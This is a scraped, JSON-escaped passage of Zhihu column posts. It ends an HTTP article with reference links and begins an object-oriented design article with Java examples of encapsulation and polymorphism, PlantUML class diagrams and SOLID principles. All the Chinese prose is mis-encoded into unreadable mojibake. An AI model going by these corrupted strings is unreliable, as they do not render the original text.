target=\"_blank\" rel=\"nofollow noreferrer\">HTTPS è¯ä¹¦åŸç†</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//stackoverflow.com/questions/176264/what-is-the-difference-between-a-uri-a-url-and-a-urn\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">What is the difference between a URI, a URL and a URN?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">XMLHttpRequest</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//blog.josephscott.org/2009/08/27/xmlhttprequest-xhr-uses-multiple-packets-for-http-post/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">XMLHttpRequest (XHR) Uses Multiple Packets for HTTP POST?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.ssl2buy.com/wiki/symmetric-vs-asymmetric-encryption-what-are-differences\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Symmetric vs. Asymmetric Encryption â€“ What are differences?</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.kancloud.cn/digest/web-performance-http2\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Web æ€§èƒ½ä¼˜åŒ–ä¸ HTTP/2</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//developers.google.com/web/fundamentals/performance/http2/%3Fhl%3Dzh-cn\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">HTTP/2 ç®€ä»‹</a></li></ul><h2>å¾®ä¿¡å…¬ä¼—å·</h2><p>å¾®ä¿¡å…¬ä¼—å· CyC2018 æä¾›äº†è¯¥é¡¹ç›®çš„ç¦»çº¿é˜…è¯»ç‰ˆæœ¬ï¼Œåå°å›å¤ &#34;ä¸‹è½½&#34; å³å¯é¢†å–ã€‚ä¹Ÿæä¾›äº†ä¸€ä»½æŠ€æœ¯é¢è¯•å¤ä¹ å¤§çº²ï¼Œä¸ä»…ç³»ç»Ÿæ•´ç†äº†é¢è¯•çŸ¥è¯†ç‚¹ï¼Œè€Œä¸”æ ‡æ³¨äº†å„ä¸ªçŸ¥è¯†ç‚¹çš„é‡è¦ç¨‹åº¦ï¼Œä»è€Œå¸®ä½ ç†æ¸…å¤šè€Œæ‚çš„é¢è¯•çŸ¥è¯†ç‚¹ï¼Œåå°å›å¤ &#34;å¤§çº²&#34; å³å¯é¢†å–ã€‚æˆ‘åŸºæœ¬æ˜¯æŒ‰ç…§è¿™ä¸ªå¤§çº²æ¥è¿›è¡Œå¤ä¹ çš„ï¼Œå¯¹æˆ‘æ‹¿åˆ°äº† BAT å¤´æ¡ç­‰ Offer èµ·åˆ°å¾ˆå¤§çš„å¸®åŠ©ã€‚ä½ ä»¬å®Œå…¨å¯ä»¥å’Œæˆ‘ä¸€æ ·æ ¹æ®å¤§çº²ä¸Šåˆ—çš„çŸ¥è¯†ç‚¹æ¥è¿›è¡Œå¤ä¹ ï¼Œå°±ä¸ç”¨çœ‹å¾ˆå¤šä¸é‡è¦çš„å†…å®¹ï¼Œä¹Ÿå¯ä»¥çŸ¥é“å“ªäº›å†…å®¹å¾ˆé‡è¦ä»è€Œå¤šå®‰æ’ä¸€äº›å¤ä¹ æ—¶é—´ã€‚</p><p class=\"ztext-empty-paragraph\"><br/></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;937&#39; height=&#39;354&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"937\" data-rawheight=\"354\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"937\" data-original=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-2a4a3f26355998cfe8c467463a32a80d_b.jpg\"/></figure><p></p>", 
            "topic": [
                {
                    "tag": "HTTP", 
                    "tagLink": "https://api.zhihu.com/topics/19588535"
                }, 
                {
                    "tag": "é¢è¯•", 
                    "tagLink": "https://api.zhihu.com/topics/19552079"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/68529668", 
            "userName": "CyC2018", 
            "userLink": "https://www.zhihu.com/people/de0dbaba77411ee53dd3207d762ad7d5", 
            "upvote": 1, 
            "title": "é¢å‘å¯¹è±¡æ€æƒ³", 
            "content": "<p></p><h2>ä¸€ã€ä¸‰å¤§ç‰¹æ€§</h2><h2>å°è£…</h2><p>åˆ©ç”¨æŠ½è±¡æ•°æ®ç±»å‹å°†æ•°æ®å’ŒåŸºäºæ•°æ®çš„æ“ä½œå°è£…åœ¨ä¸€èµ·ï¼Œä½¿å…¶æ„æˆä¸€ä¸ªä¸å¯åˆ†å‰²çš„ç‹¬ç«‹å®ä½“ã€‚æ•°æ®è¢«ä¿æŠ¤åœ¨æŠ½è±¡æ•°æ®ç±»å‹çš„å†…éƒ¨ï¼Œå°½å¯èƒ½åœ°éšè—å†…éƒ¨çš„ç»†èŠ‚ï¼Œåªä¿ç•™ä¸€äº›å¯¹å¤–çš„æ¥å£ä½¿å…¶ä¸å¤–éƒ¨å‘ç”Ÿè”ç³»ã€‚ç”¨æˆ·æ— éœ€å…³å¿ƒå¯¹è±¡å†…éƒ¨çš„ç»†èŠ‚ï¼Œä½†å¯ä»¥é€šè¿‡å¯¹è±¡å¯¹å¤–æä¾›çš„æ¥å£æ¥è®¿é—®è¯¥å¯¹è±¡ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>å‡å°‘è€¦åˆï¼šå¯ä»¥ç‹¬ç«‹åœ°å¼€å‘ã€æµ‹è¯•ã€ä¼˜åŒ–ã€ä½¿ç”¨ã€ç†è§£å’Œä¿®æ”¹</li><li>å‡è½»ç»´æŠ¤çš„è´Ÿæ‹…ï¼šå¯ä»¥æ›´å®¹æ˜“è¢«ç¨‹åºå‘˜ç†è§£ï¼Œå¹¶ä¸”åœ¨è°ƒè¯•çš„æ—¶å€™å¯ä»¥ä¸å½±å“å…¶ä»–æ¨¡å—</li><li>æœ‰æ•ˆåœ°è°ƒèŠ‚æ€§èƒ½ï¼šå¯ä»¥é€šè¿‡å‰–ææ¥ç¡®å®šå“ªäº›æ¨¡å—å½±å“äº†ç³»ç»Ÿçš„æ€§èƒ½</li><li>æé«˜è½¯ä»¶çš„å¯é‡ç”¨æ€§</li><li>é™ä½äº†æ„å»ºå¤§å‹ç³»ç»Ÿçš„é£é™©ï¼šå³ä½¿æ•´ä¸ªç³»ç»Ÿä¸å¯ç”¨ï¼Œä½†æ˜¯è¿™äº›ç‹¬ç«‹çš„æ¨¡å—å´æœ‰å¯èƒ½æ˜¯å¯ç”¨çš„</li></ul><p>ä»¥ä¸‹ Person ç±»å°è£… nameã€genderã€age ç­‰å±æ€§ï¼Œå¤–ç•Œåªèƒ½é€šè¿‡ get() æ–¹æ³•è·å–ä¸€ä¸ª Person å¯¹è±¡çš„ name å±æ€§å’Œ gender å±æ€§ï¼Œè€Œæ— æ³•è·å– age å±æ€§ï¼Œä½†æ˜¯ age å±æ€§å¯ä»¥ä¾› work() æ–¹æ³•ä½¿ç”¨ã€‚</p><p>æ³¨æ„åˆ° gender å±æ€§ä½¿ç”¨ int æ•°æ®ç±»å‹è¿›è¡Œå­˜å‚¨ï¼Œå°è£…ä½¿å¾—ç”¨æˆ·æ³¨æ„ä¸åˆ°è¿™ç§å®ç°ç»†èŠ‚ã€‚å¹¶ä¸”åœ¨éœ€è¦ä¿®æ”¹ gender å±æ€§ä½¿ç”¨çš„æ•°æ®ç±»å‹æ—¶ï¼Œä¹Ÿå¯ä»¥åœ¨ä¸å½±å“å®¢æˆ·ç«¯ä»£ç çš„æƒ…å†µä¸‹è¿›è¡Œã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Person</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">private</span> <span class=\"n\">String</span> <span class=\"n\">name</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">gender</span><span class=\"o\">;</span>\n    <span class=\"kd\">private</span> <span class=\"kt\">int</span> <span class=\"n\">age</span><span class=\"o\">;</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">getName</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">name</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"n\">String</span> <span class=\"nf\">getGender</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">return</span> <span class=\"n\">gender</span> <span class=\"o\">==</span> <span class=\"n\">0</span> <span class=\"o\">?</span> <span class=\"s\">&#34;man&#34;</span> <span class=\"o\">:</span> <span class=\"s\">&#34;woman&#34;</span><span class=\"o\">;</span>\n    <span class=\"o\">}</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">work</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"k\">if</span> <span class=\"o\">(</span><span class=\"n\">18</span> <span class=\"o\">&lt;=</span> <span class=\"n\">age</span> <span class=\"o\">&amp;&amp;</span> <span class=\"n\">age</span> <span class=\"o\">&lt;=</span> <span class=\"n\">50</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">name</span> <span class=\"o\">+</span> <span class=\"s\">&#34; is working very hard!&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span> <span class=\"k\">else</span> <span class=\"o\">{</span>\n            <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"n\">name</span> <span class=\"o\">+</span> <span class=\"s\">&#34; can&#39;t work any more!&#34;</span><span class=\"o\">);</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span></code></pre></div><h2>ç»§æ‰¿</h2><p>ç»§æ‰¿å®ç°äº†  <b>IS-A</b>  å…³ç³»ï¼Œä¾‹å¦‚ Cat å’Œ Animal å°±æ˜¯ä¸€ç§ IS-A å…³ç³»ï¼Œå› æ­¤ Cat å¯ä»¥ç»§æ‰¿è‡ª Animalï¼Œä»è€Œè·å¾— Animal é private çš„å±æ€§å’Œæ–¹æ³•ã€‚</p><p>ç»§æ‰¿åº”è¯¥éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œå­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚</p><p>Cat å¯ä»¥å½“åš Animal æ¥ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥ä½¿ç”¨ Animal å¼•ç”¨ Cat å¯¹è±¡ã€‚çˆ¶ç±»å¼•ç”¨æŒ‡å‘å­ç±»å¯¹è±¡ç§°ä¸º  <b>å‘ä¸Šè½¬å‹</b> ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"n\">Animal</span> <span class=\"n\">animal</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">Cat</span><span class=\"o\">();</span></code></pre></div><h2>å¤šæ€</h2><p>å¤šæ€åˆ†ä¸ºç¼–è¯‘æ—¶å¤šæ€å’Œè¿è¡Œæ—¶å¤šæ€ï¼š</p><ul><li>ç¼–è¯‘æ—¶å¤šæ€ä¸»è¦æŒ‡æ–¹æ³•çš„é‡è½½</li><li>è¿è¡Œæ—¶å¤šæ€æŒ‡ç¨‹åºä¸­å®šä¹‰çš„å¯¹è±¡å¼•ç”¨æ‰€æŒ‡å‘çš„å…·ä½“ç±»å‹åœ¨è¿è¡ŒæœŸé—´æ‰ç¡®å®š</li></ul><p>è¿è¡Œæ—¶å¤šæ€æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼š</p><ul><li>ç»§æ‰¿</li><li>è¦†ç›–ï¼ˆé‡å†™ï¼‰</li><li>å‘ä¸Šè½¬å‹</li></ul><p>ä¸‹é¢çš„ä»£ç ä¸­ï¼Œä¹å™¨ç±»ï¼ˆInstrumentï¼‰æœ‰ä¸¤ä¸ªå­ç±»ï¼šWind å’Œ Percussionï¼Œå®ƒä»¬éƒ½è¦†ç›–äº†çˆ¶ç±»çš„ play() æ–¹æ³•ï¼Œå¹¶ä¸”åœ¨ main() æ–¹æ³•ä¸­ä½¿ç”¨çˆ¶ç±» Instrument æ¥å¼•ç”¨ Wind å’Œ Percussion å¯¹è±¡ã€‚åœ¨ Instrument å¼•ç”¨è°ƒç”¨ play() æ–¹æ³•æ—¶ï¼Œä¼šæ‰§è¡Œå®é™…å¼•ç”¨å¯¹è±¡æ‰€åœ¨ç±»çš„ play() æ–¹æ³•ï¼Œè€Œä¸æ˜¯ Instrument ç±»çš„æ–¹æ³•ã€‚</p><div class=\"highlight\"><pre><code class=\"language-java\"><span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Instrument</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">play</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;Instument is playing...&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Wind</span> <span class=\"kd\">extends</span> <span class=\"n\">Instrument</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">play</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;Wind is playing...&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Percussion</span> <span class=\"kd\">extends</span> <span class=\"n\">Instrument</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kt\">void</span> <span class=\"nf\">play</span><span class=\"o\">()</span> <span class=\"o\">{</span>\n        <span class=\"n\">System</span><span class=\"o\">.</span><span class=\"na\">out</span><span class=\"o\">.</span><span class=\"na\">println</span><span class=\"o\">(</span><span class=\"s\">&#34;Percussion is playing...&#34;</span><span class=\"o\">);</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"kd\">public</span> <span class=\"kd\">class</span> <span class=\"nc\">Music</span> <span class=\"o\">{</span>\n\n    <span class=\"kd\">public</span> <span class=\"kd\">static</span> <span class=\"kt\">void</span> <span class=\"nf\">main</span><span class=\"o\">(</span><span class=\"n\">String</span><span class=\"o\">[]</span> <span class=\"n\">args</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n        <span class=\"n\">List</span><span class=\"o\">&lt;</span><span class=\"n\">Instrument</span><span class=\"o\">&gt;</span> <span class=\"n\">instruments</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"n\">ArrayList</span><span class=\"o\">&lt;&gt;();</span>\n        <span class=\"n\">instruments</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">Wind</span><span class=\"o\">());</span>\n        <span class=\"n\">instruments</span><span class=\"o\">.</span><span class=\"na\">add</span><span class=\"o\">(</span><span class=\"k\">new</span> <span class=\"n\">Percussion</span><span class=\"o\">());</span>\n        <span class=\"k\">for</span><span class=\"o\">(</span><span class=\"n\">Instrument</span> <span class=\"n\">instrument</span> <span class=\"o\">:</span> <span class=\"n\">instruments</span><span class=\"o\">)</span> <span class=\"o\">{</span>\n            <span class=\"n\">instrument</span><span class=\"o\">.</span><span class=\"na\">play</span><span class=\"o\">();</span>\n        <span class=\"o\">}</span>\n    <span class=\"o\">}</span>\n<span class=\"o\">}</span>\n<span class=\"n\">Wind</span> <span class=\"n\">is</span> <span class=\"n\">playing</span><span class=\"o\">...</span>\n<span class=\"n\">Percussion</span> <span class=\"n\">is</span> <span class=\"n\">playing</span><span class=\"o\">...</span></code></pre></div><h2>äºŒã€ç±»å›¾</h2><p>ä»¥ä¸‹ç±»å›¾ä½¿ç”¨ <a href=\"https://link.zhihu.com/?target=https%3A//www.planttext.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">PlantUML</a> ç»˜åˆ¶ï¼Œæ›´å¤šè¯­æ³•åŠä½¿ç”¨è¯·å‚è€ƒï¼š<a href=\"https://link.zhihu.com/?target=http%3A//plantuml.com/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">plantuml.com/</span><span class=\"invisible\"></span></a> ã€‚</p><h2>æ³›åŒ–å…³ç³» (Generalization)</h2><p>ç”¨æ¥æè¿°ç»§æ‰¿å…³ç³»ï¼Œåœ¨ Java ä¸­ä½¿ç”¨ extends å…³é”®å­—ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-90a615e2f896a6a0fa599e64bfced1b3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"302\" data-rawheight=\"352\" class=\"content_image\" width=\"302\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;302&#39; height=&#39;352&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"302\" data-rawheight=\"352\" class=\"content_image lazy\" width=\"302\" data-actualsrc=\"https://pic4.zhimg.com/v2-90a615e2f896a6a0fa599e64bfced1b3_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-text\">@startuml\n\ntitle Generalization\n\nclass Vihical\nclass Car\nclass Trunck\n\nVihical &lt;|-- Car\nVihical &lt;|-- Trunck\n\n@enduml</code></pre></div><h2>å®ç°å…³ç³» (Realization)</h2><p>ç”¨æ¥å®ç°ä¸€ä¸ªæ¥å£ï¼Œåœ¨ Java ä¸­ä½¿ç”¨ implements å…³é”®å­—ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-5116aff9fd51c77bc91e8b93bb0f03c0_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"271\" data-rawheight=\"360\" class=\"content_image\" width=\"271\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;271&#39; height=&#39;360&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"271\" data-rawheight=\"360\" class=\"content_image lazy\" width=\"271\" data-actualsrc=\"https://pic1.zhimg.com/v2-5116aff9fd51c77bc91e8b93bb0f03c0_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-text\">@startuml\n\ntitle Realization\n\ninterface MoveBehavior\nclass Fly\nclass Run\n\nMoveBehavior &lt;|.. Fly\nMoveBehavior &lt;|.. Run\n\n@enduml</code></pre></div><h2>èšåˆå…³ç³» (Aggregation)</h2><p>è¡¨ç¤ºæ•´ä½“ç”±éƒ¨åˆ†ç»„æˆï¼Œä½†æ˜¯æ•´ä½“å’Œéƒ¨åˆ†ä¸æ˜¯å¼ºä¾èµ–çš„ï¼Œæ•´ä½“ä¸å­˜åœ¨äº†éƒ¨åˆ†è¿˜æ˜¯ä¼šå­˜åœ¨ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-fe80d0bfc5318d6de8b7d0023e38e041_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"538\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb\" width=\"538\" data-original=\"https://pic2.zhimg.com/v2-fe80d0bfc5318d6de8b7d0023e38e041_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;538&#39; height=&#39;351&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"538\" data-rawheight=\"351\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"538\" data-original=\"https://pic2.zhimg.com/v2-fe80d0bfc5318d6de8b7d0023e38e041_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-fe80d0bfc5318d6de8b7d0023e38e041_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-text\">@startuml\n\ntitle Aggregation\n\nclass Computer\nclass Keyboard\nclass Mouse\nclass Screen\n\nComputer o-- Keyboard\nComputer o-- Mouse\nComputer o-- Screen\n\n@enduml</code></pre></div><h2>ç»„åˆå…³ç³» (Composition)</h2><p>å’Œèšåˆä¸åŒï¼Œç»„åˆä¸­æ•´ä½“å’Œéƒ¨åˆ†æ˜¯å¼ºä¾èµ–çš„ï¼Œæ•´ä½“ä¸å­˜åœ¨äº†éƒ¨åˆ†ä¹Ÿä¸å­˜åœ¨äº†ã€‚æ¯”å¦‚å…¬å¸å’Œéƒ¨é—¨ï¼Œå…¬å¸æ²¡äº†éƒ¨é—¨å°±ä¸å­˜åœ¨äº†ã€‚ä½†æ˜¯å…¬å¸å’Œå‘˜å·¥å°±å±äºèšåˆå…³ç³»äº†ï¼Œå› ä¸ºå…¬å¸æ²¡äº†å‘˜å·¥è¿˜åœ¨ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-3b29f30dad1e53d8311e167615f128b3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"356\" class=\"origin_image zh-lightbox-thumb\" width=\"467\" data-original=\"https://pic4.zhimg.com/v2-3b29f30dad1e53d8311e167615f128b3_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;467&#39; height=&#39;356&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"356\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"467\" data-original=\"https://pic4.zhimg.com/v2-3b29f30dad1e53d8311e167615f128b3_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-3b29f30dad1e53d8311e167615f128b3_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-text\">@startuml\n\ntitle Composition\n\nclass Company\nclass DepartmentA\nclass DepartmentB\n\nCompany *-- DepartmentA\nCompany *-- DepartmentB\n\n@enduml</code></pre></div><h2>å…³è”å…³ç³» (Association)</h2><p>è¡¨ç¤ºä¸åŒç±»å¯¹è±¡ä¹‹é—´æœ‰å…³è”ï¼Œè¿™æ˜¯ä¸€ç§é™æ€å…³ç³»ï¼Œä¸è¿è¡Œè¿‡ç¨‹çš„çŠ¶æ€æ— å…³ï¼Œåœ¨æœ€å¼€å§‹å°±å¯ä»¥ç¡®å®šã€‚å› æ­¤ä¹Ÿå¯ä»¥ç”¨ 1 å¯¹ 1ã€å¤šå¯¹ 1ã€å¤šå¯¹å¤šè¿™ç§å…³è”å…³ç³»æ¥è¡¨ç¤ºã€‚æ¯”å¦‚å­¦ç”Ÿå’Œå­¦æ ¡å°±æ˜¯ä¸€ç§å…³è”å…³ç³»ï¼Œä¸€ä¸ªå­¦æ ¡å¯ä»¥æœ‰å¾ˆå¤šå­¦ç”Ÿï¼Œä½†æ˜¯ä¸€ä¸ªå­¦ç”Ÿåªå±äºä¸€ä¸ªå­¦æ ¡ï¼Œå› æ­¤è¿™æ˜¯ä¸€ç§å¤šå¯¹ä¸€çš„å…³ç³»ï¼Œåœ¨è¿è¡Œå¼€å§‹ä¹‹å‰å°±å¯ä»¥ç¡®å®šã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-9f4f39c11d8b98a7b11052b6be7143ab_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"343\" data-rawheight=\"174\" class=\"content_image\" width=\"343\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;343&#39; height=&#39;174&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"343\" data-rawheight=\"174\" class=\"content_image lazy\" width=\"343\" data-actualsrc=\"https://pic4.zhimg.com/v2-9f4f39c11d8b98a7b11052b6be7143ab_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-text\">@startuml\n\ntitle Association\n\nclass School\nclass Student\n\nSchool &#34;1&#34; - &#34;n&#34; Student\n\n@enduml</code></pre></div><h2>ä¾èµ–å…³ç³» (Dependency)</h2><p>å’Œå…³è”å…³ç³»ä¸åŒçš„æ˜¯ï¼Œä¾èµ–å…³ç³»æ˜¯åœ¨è¿è¡Œè¿‡ç¨‹ä¸­èµ·ä½œç”¨çš„ã€‚A ç±»å’Œ B ç±»æ˜¯ä¾èµ–å…³ç³»ä¸»è¦æœ‰ä¸‰ç§å½¢å¼ï¼š</p><ul><li>A ç±»æ˜¯ B ç±»æ–¹æ³•çš„å±€éƒ¨å˜é‡ï¼›</li><li>A ç±»æ˜¯ B ç±»æ–¹æ³•å½“ä¸­çš„ä¸€ä¸ªå‚æ•°ï¼›</li><li>A ç±»å‘ B ç±»å‘é€æ¶ˆæ¯ï¼Œä»è€Œå½±å“ B ç±»å‘ç”Ÿå˜åŒ–ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-91da90365d7b191cfdcfc93b4015fc48_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"537\" data-rawheight=\"403\" class=\"origin_image zh-lightbox-thumb\" width=\"537\" data-original=\"https://pic1.zhimg.com/v2-91da90365d7b191cfdcfc93b4015fc48_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;537&#39; height=&#39;403&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"537\" data-rawheight=\"403\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"537\" data-original=\"https://pic1.zhimg.com/v2-91da90365d7b191cfdcfc93b4015fc48_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-91da90365d7b191cfdcfc93b4015fc48_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><div class=\"highlight\"><pre><code class=\"language-text\">@startuml\n\ntitle Dependency\n\nclass Vihicle {\n    move(MoveBehavior)\n}\n\ninterface MoveBehavior {\n    move()\n}\n\nnote &#34;MoveBehavior.move()&#34; as N\n\nVihicle ..&gt; MoveBehavior\n\nVihicle .. N\n\n@enduml</code></pre></div><h2>ä¸‰ã€è®¾è®¡åŸåˆ™</h2><h2>S.O.L.I.D</h2><p>| ç®€å†™ | å…¨æ‹¼ | ä¸­æ–‡ç¿»è¯‘ | | :--: | :--: | :--: | | SRP | The Single Responsibility Principle    | å•ä¸€è´£ä»»åŸåˆ™ | | OCP | The Open Closed Principle              | å¼€æ”¾å°é—­åŸåˆ™ | | LSP | The Liskov Substitution Principle      | é‡Œæ°æ›¿æ¢åŸåˆ™ | | ISP | The Interface Segregation Principle    | æ¥å£åˆ†ç¦»åŸåˆ™ | | DIP | The Dependency Inversion Principle     | ä¾èµ–å€’ç½®åŸåˆ™ |</p><h3>1. å•ä¸€è´£ä»»åŸåˆ™</h3><blockquote> ä¿®æ”¹ä¸€ä¸ªç±»çš„åŸå› åº”è¯¥åªæœ‰ä¸€ä¸ªã€‚<br/> </blockquote><p>æ¢å¥è¯è¯´å°±æ˜¯è®©ä¸€ä¸ªç±»åªè´Ÿè´£ä¸€ä»¶äº‹ï¼Œå½“è¿™ä¸ªç±»éœ€è¦åšè¿‡å¤šäº‹æƒ…çš„æ—¶å€™ï¼Œå°±éœ€è¦åˆ†è§£è¿™ä¸ªç±»ã€‚</p><p>å¦‚æœä¸€ä¸ªç±»æ‰¿æ‹…çš„èŒè´£è¿‡å¤šï¼Œå°±ç­‰äºæŠŠè¿™äº›èŒè´£è€¦åˆåœ¨äº†ä¸€èµ·ï¼Œä¸€ä¸ªèŒè´£çš„å˜åŒ–å¯èƒ½ä¼šå‰Šå¼±è¿™ä¸ªç±»å®Œæˆå…¶å®ƒèŒè´£çš„èƒ½åŠ›ã€‚</p><h3>2. å¼€æ”¾å°é—­åŸåˆ™</h3><blockquote> 